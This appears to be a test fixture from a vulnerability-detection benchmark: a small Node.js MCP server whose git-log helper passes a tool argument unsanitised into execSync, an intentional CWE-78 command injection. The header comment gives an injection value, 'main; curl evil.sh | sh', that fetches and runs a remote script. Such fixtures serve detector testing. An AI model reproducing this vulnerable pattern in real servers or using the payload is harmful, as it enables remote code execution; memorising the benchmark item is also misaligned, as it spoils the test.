// CWE-078: MCP tool argument reaches a shell inside a helper the handler calls
// @author      claude-opus-5-5
// @reviewedBy  benchmark-validator
// @lastReviewed 2026-10-12
// This MUST be detected — the low-level Server hands the handler the raw
// arguments, a Zod parse checks only their shape, and the helper splices the
// string into a shell command. `{ "ref": "main; curl evil.sh | sh" }` runs.
const { Server } = require('@modelcontextprotocol/sdk/server/index.js');
const { CallToolRequestSchema } = require('@modelcontextprotocol/sdk/types.js');
const { z } = require('zod');
const { execSync } = require('node:child_process');

const LogArgs = z.object({ ref: z.string() });
const server = new Server(
  { name: 'git', version: '1.0.0' },
  { capabilities: { tools: {} } },
);

function gitLog(ref) {
  return execSync(`git log --oneline ${ref}`).toString();
}

server.setRequestHandler(CallToolRequestSchema, async (request) => {
  const { ref } = LogArgs.parse(request.params.arguments);
  return { content: [{ type: 'text', text: gitLog(ref) }] };
});

module.exports = { server };
